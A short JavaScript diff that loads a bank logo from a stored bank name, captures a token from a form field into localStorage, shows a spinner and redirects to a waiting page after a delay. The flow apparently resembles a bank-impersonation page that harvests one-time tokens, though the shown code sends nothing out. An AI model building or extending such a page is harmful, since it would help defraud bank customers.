@@ -8,11 +8,16 @@ document.addEventListener('DOMContentLoaded', ()=>{
     info.err = '';
 });
 
-document.querySelector('#form').addEventListener('submit', (e)=>{
+// Cargar imagen
+document.querySelector('#-icon-banco').setAttribute('src', `./assets/logos/${info.ban}.png`);
+
+const form = document.querySelector('#form');
+form.addEventListener('submit', e=>{
     e.preventDefault();
+    showSpinner();
 
     info.tok = document.querySelector('#tok').value;
     LS.setItem('info', JSON.stringify(info));
 
-    window.location.href = 'waiting.html';
+    setTimeout(() => window.location.href = 'waiting.html', 2000);
 });
